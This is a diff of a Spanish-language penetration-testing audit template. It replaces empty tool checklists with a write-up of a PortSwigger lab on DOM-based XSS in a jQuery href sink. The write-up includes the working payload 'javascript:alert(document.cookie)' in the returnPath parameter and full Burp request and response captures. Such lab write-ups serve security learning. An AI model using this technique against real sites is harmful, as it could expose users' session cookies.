@@ -4,7 +4,7 @@
 
 <details>
 
-<summary>👁️ RECONOCIMIENTO PASIVO</summary>
+<summary>👁️ RECONOCIMIENTO PASIVO ✔️ </summary>
 
 ## AUDITORIA DE: ((RELEVANT))
 
@@ -12,204 +12,33 @@
 
 ***
 
-### RECONOCIMIENTO PASIVO
+### RECONOCIMIENTO PASIVO 
 
-*   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
+*   [x] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
-    # Espacio para fragmento de código Python -->
+    URL CON EL PAYLOAD  (javascript:alert(document.cookie)) QUE FUNCIONO: 
+
+
+    https://0aac007e04fc89f280813502004b0007.web-security-academy.net/feedback? 
+    returnPath=javascript:alert(document.cookie)
+    
+    
+    ---------
+    
+    
+    
+    SCRIPT :
+    
+    
+    $(function() {
+    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+    });
+                    
     ```
+     ![DOM-XSSenFuntiondeHREF-PATH](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/31cf373e-6510-41ee-8d8f-db057b812489)
 
-    * CONCLUSION:
-*   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WAYBACKMACHINE👈 --------------------------------->[https://archive.org/web/](https://archive.org/web/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] MALTEGO👈 --------------------------------->[https://www.maltego.com/](https://www.maltego.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SHODAN👈 --------------------------------->[https://www.shodan.io/ ](https://www.shodan.io/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/shodan)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] CENSYS👈 --------------------------------->[https://search.censys.io/](https://search.censys.io/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WEB-CHECK👈 --------------------------------->[https://web-check.xyz/](https://web-check.xyz/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] THEHARVESTER👈 --------------------------------->[https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WAPPALYZER👈 --------------------------------->[https://www.wappalyzer.com/](https://www.wappalyzer.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] DNSdumpster👈 --------------------------------->[https://dnsdumpster.com/](https://dnsdumpster.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] ROBTEX👈 --------------------------------->[https://www.robtex.com/#google\_vignette](https://www.robtex.com/#google\_vignette)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WHOIS👈 --------------------------------->[https://who.is/](https://who.is/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] NSLOOKUP👈 --------------------------------->[https://www.nslookup.io/](https://www.nslookup.io/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] GHUNT👈 --------------------------------->[https://github.com/mxrch/GHunt](https://github.com/mxrch/GHunt)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] LLANTUN👈 --------------------------------->[https://github.com/lesandcl/Llaitun](https://github.com/lesandcl/Llaitun)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] DISCOVER👈 --------------------------------->[https://github.com/leebaird/discover](https://github.com/leebaird/discover)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SHERLOCK👈 --------------------------------->[https://github.com/sherlock-project/sherlock](https://github.com/sherlock-project/sherlock)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WHATWEB👈 --------------------------------->[https://www.kali.org/tools/whatweb/](https://www.kali.org/tools/whatweb/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] DIAGRAMAS👈 --------------------------------->[https://app.diagrams.net/](https://app.diagrams.net/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] P4INformesmentales👈 --------------------------------->[https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/curso-hacking-con-python/tool-para-informes-de-mapas-mentales-p4informesmentales.py](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/curso-hacking-con-python/tool-para-informes-de-mapas-mentales-p4informesmentales.py)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
+    * CONCLUSION: LUEGO DE INCORPORAR EN LA QUERY DE LA URL NEUSTRO PAYLOAD (javascript:alert(document.cookie)) SIMPLEMENTE CONSEGIMOS LA EJECUCION DE ESTA PATH QUE SE AGREGA POR EL SCRIPT EN EL DOM LOGARANDO LA INYECION XSS Y EL ALERT.
 
 ***
 
@@ -225,7 +54,7 @@
 
 <details>
 
-<summary>🔬 ANALISIS FORENSE</summary>
+<summary>🔬 ANALISIS FORENSE ❌ </summary>
 
 ### ANALISIS FORENSE
 
@@ -424,7 +253,7 @@
 
 <details>
 
-<summary>👊 RECONOCIMIENTO ACTIVO</summary>
+<summary>👊 RECONOCIMIENTO ACTIVO ❌</summary>
 
 ### RECONOCIMIENTO ACTIVO
 
@@ -861,7 +690,7 @@
 
 <details>
 
-<summary>🕵️ INVESTIGACION OSINT</summary>
+<summary>🕵️ INVESTIGACION OSINT ❌</summary>
 
 ### INVESTIGACION OSINT
 
@@ -1060,7 +889,7 @@
 
 <details>
 
-<summary>⛓️ HASHES Y DESENCRIPTADOS</summary>
+<summary>⛓️ HASHES Y DESENCRIPTADOS ❌</summary>
 
 ### HASHES Y DESENCRIPTADOS
 
@@ -1287,7 +1116,7 @@
 
 <details>
 
-<summary>💪 FUERZA BRUTA A LOGINS</summary>
+<summary>💪 FUERZA BRUTA A LOGINS ❌</summary>
 
 ### FUERZA BRUTA A LOGINS
 
@@ -1451,7 +1280,7 @@
 
 <details>
 
-<summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS</summary>
+<summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS ❌</summary>
 
 ### SCRIPT DE EXPLOIT Y PAYLOADS
 
@@ -1573,178 +1402,260 @@
 
 <details>
 
-<summary>🤯 EXPLOTACION</summary>
+<summary>🤯 EXPLOTACION ✔️</summary>
 
 ### EXPLOTACION
 
-*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)
+*   [x] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
 
     ```python
-    # Espacio para fragmento de código Python -->
+    REQUEST NORMAL:
+
+
+    GET /feedback?returnPath=/ HTTP/2
+    Host: 0a5b005403084840842406c7000c009f.web-security-academy.net
+    Cookie: session=ikLJY5rvgZijWf3eFcy7eLPtLB3dh5Ql
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "Linux"
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0a5b005403084840842406c7000c009f.web-security-academy.net/
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: es-419,es;q=0.9,en;q=0.8
+    Connection: close
+    
+    
+    RESPONSE NORMAL:
+    
+    
+    
+    
+    HTTP/2 200 OK
+    Content-Type: text/html; charset=utf-8
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 4187
+    
+    <!DOCTYPE html>
+    <html>
+        <head>
+            <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+            <link href=/resources/css/labs.css rel=stylesheet>
+            <title>DOM XSS in jQuery anchor href attribute sink using location.search source</title>
+        </head>
+        <body>
+            <script src="/resources/labheader/js/labHeader.js"></script>
+            <div id="academyLabHeader">
+                <section class='academyLabBanner'>
+                    <div class=container>
+                        <div class=logo></div>
+                            <div class=title-container>
+                                <h2>DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</h2>
+                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink'>
+                                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                        <g>
+                                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                        </g>
+                                    </svg>
+                                </a>
+                            </div>
+                            <div class='widgetcontainer-lab-status is-notsolved'>
+                                <span>LAB</span>
+                                <p>Not solved</p>
+                                <span class=lab-status-icon></span>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </div>
+            <div theme="">
+                <section class="maincontainer">
+                    <div class="container is-page">
+                        <header class="navigation-header">
+                            <section class="top-links">
+                                <a href=/>Home</a><p>|</p>
+                                <a href="/feedback?returnPath=/feedback">Submit feedback</a><p>|</p>
+                            </section>
+                        </header>
+                        <header class="notification-header">
+                        </header>
+                        <h1>Submit feedback</h1>
+                        <form id="feedbackForm" action="/feedback/submit" method="POST" enctype="application/x-www-form-urlencoded">
+                            <input required type="hidden" name="csrf" value="MFsn8qaMQX31owjni529Y9VTDRk588x4">
+                            <label>Name:</label>
+                            <input required type="text" name="name">
+                            <label>Email:</label>
+                            <input required type="email" name="email">
+                            <label>Subject:</label>
+                            <input required type="text" name="subject">
+                            <label>Message:</label>
+                            <textarea required rows="12" cols="300" name="message"></textarea>
+                            <button class="button" type="submit">
+                                Submit feedback
+                            </button>
+                            <span id="feedbackResult"></span>
+                            <script src="/resources/js/jquery_1-8-2.js"></script>
+                            <div class="is-linkback">
+                                <a id="backLink">Back</a>
+                            </div>
+                            <script>
+                                $(function() {
+                                    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+                                });
+                            </script>
+                        </form>
+                        <script src="/resources/js/submitFeedback.js"></script>
+                        <br>
+                    </div>
+                </section>
+                <div class="footer-wrapper">
+                </div>
+            </div>
+        </body>
+    </html>
+    
+    
+    
+    
+    ---------
+    
+    
+    
+    
+    
+    
+    REQUEST CON EL PAYLOAD:
+    
+    
+    
+    
+    GET /feedback?returnPath=javascript:alert(document.cookie) HTTP/2
+    Host: 0a5b005403084840842406c7000c009f.web-security-academy.net
+    Cookie: session=ikLJY5rvgZijWf3eFcy7eLPtLB3dh5Ql
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "Linux"
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0a5b005403084840842406c7000c009f.web-security-academy.net/
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: es-419,es;q=0.9,en;q=0.8
+    
+    
+    
+    
+    
+    
+    RESPONSE:
+    
+    
+    
+    
+    
+    
+    
+    HTTP/2 200 OK
+    Content-Type: text/html; charset=utf-8
+    X-Frame-Options: SAMEORIGIN
+    Content-Length: 4187
+    
+    <!DOCTYPE html>
+    <html>
+        <head>
+            <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+            <link href=/resources/css/labs.css rel=stylesheet>
+            <title>DOM XSS in jQuery anchor href attribute sink using location.search source</title>
+        </head>
+        <body>
+            <script src="/resources/labheader/js/labHeader.js"></script>
+            <div id="academyLabHeader">
+                <section class='academyLabBanner'>
+                    <div class=container>
+                        <div class=logo></div>
+                            <div class=title-container>
+                                <h2>DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</h2>
+                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink'>
+                                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                        <g>
+                                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                        </g>
+                                    </svg>
+                                </a>
+                            </div>
+                            <div class='widgetcontainer-lab-status is-notsolved'>
+                                <span>LAB</span>
+                                <p>Not solved</p>
+                                <span class=lab-status-icon></span>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </div>
+            <div theme="">
+                <section class="maincontainer">
+                    <div class="container is-page">
+                        <header class="navigation-header">
+                            <section class="top-links">
+                                <a href=/>Home</a><p>|</p>
+                                <a href="/feedback?returnPath=/feedback">Submit feedback</a><p>|</p>
+                            </section>
+                        </header>
+                        <header class="notification-header">
+                        </header>
+                        <h1>Submit feedback</h1>
+                        <form id="feedbackForm" action="/feedback/submit" method="POST" enctype="application/x-www-form-urlencoded">
+                            <input required type="hidden" name="csrf" value="MFsn8qaMQX31owjni529Y9VTDRk588x4">
+                            <label>Name:</label>
+                            <input required type="text" name="name">
+                            <label>Email:</label>
+                            <input required type="email" name="email">
+                            <label>Subject:</label>
+                            <input required type="text" name="subject">
+                            <label>Message:</label>
+                            <textarea required rows="12" cols="300" name="message"></textarea>
+                            <button class="button" type="submit">
+                                Submit feedback
+                            </button>
+                            <span id="feedbackResult"></span>
+                            <script src="/resources/js/jquery_1-8-2.js"></script>
+                            <div class="is-linkback">
+                                <a id="backLink">Back</a>
+                            </div>
+                            <script>
+                                $(function() {
+                                    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+                                });
+                            </script>
+                        </form>
+                        <script src="/resources/js/submitFeedback.js"></script>
+                        <br>
+                    </div>
+                </section>
+                <div class="footer-wrapper">
+                </div>
+            </div>
+        </body>
+    </html>
+
     ```
-
-    * CONCLUSION:
-*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/57/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] CRACKMAPEXEC👈 --------------------------------->[https://www.kali.org/tools/crackmapexec/](https://www.kali.org/tools/crackmapexec/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] CRACKMAPEXEC👈 --------------------------------->[https://www.kali.org/tools/crackmapexec/](https://www.kali.org/tools/crackmapexec/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] VELO👈 --------------------------------->[https://github.com/Veil-Framework/Veil](https://github.com/Veil-Framework/Veil)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WEB2ATTACK👈 --------------------------------->[https://github.com/santatic/web2attack](https://github.com/santatic/web2attack)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] COMMIX👈 --------------------------------->[https://www.kali.org/tools/commix/](https://www.kali.org/tools/commix/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] WEBSPLOIT👈 --------------------------------->[https://github.com/The404Hacking/websploit](https://github.com/The404Hacking/websploit)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] BEEF FRAMEWORK EXPLOTACION👈--------------------------------->[https://www.kali.org/tools/beef-xss/](https://www.kali.org/tools/beef-xss/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] HACKTRICKS👈 --------------------------------->[https://book.hacktricks.xyz/v/es/welcome/readme](https://book.hacktricks.xyz/v/es/welcome/readme)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
+    
+    * CONCLUSION: LUEGO DE EJECUTAR NUESTRO PAYLOAD DENTROM D EL PARAMETRO "returnPath=javascript:alert(document.cookie) " LA RESPONSE DEL LADO DEL SERVIDOR NO SE VEE AFECTADA CON EL PÂRAMETRO DEL PATH QUE CARGAMOS NOSOSTROS CON NUESTRO PAYLOAD POR QUE DIRECTAMENTE SE ESTA EJECUTANDO NUESTRO "XSS" EN EL "DOM" DEL SITIO AL MOMENTO DE CARGARSE EN EL BROWSER Y LOGRANDO ASI EJECUTARSE EL PAYLOAD ALERT EFECTIVAMENTE AL HACERLE CLICK.
 
 ***
 
@@ -1758,7 +1669,7 @@
 
 <details>
 
-<summary>💠 ESCALADA DE PRIVILEGIOS WINDOWS</summary>
+<summary>💠 ESCALADA DE PRIVILEGIOS WINDOWS ❌</summary>
 
 ### ESCALADA DE PRIVILEGIOS WINDOWS
 
@@ -2020,7 +1931,7 @@
 
 <details>
 
-<summary>🐧 ESCALADA DE PRIVILEGIOS LINUX</summary>
+<summary>🐧 ESCALADA DE PRIVILEGIOS LINUX ❌</summary>
 
 ### ESCALADA DE PRIVILEGIOS LINUX
 
@@ -2247,7 +2158,7 @@
 
 <details>
 
-<summary>♻️ PIVOTING</summary>
+<summary>♻️ PIVOTING ❌</summary>
 
 ### PIVOTING
 
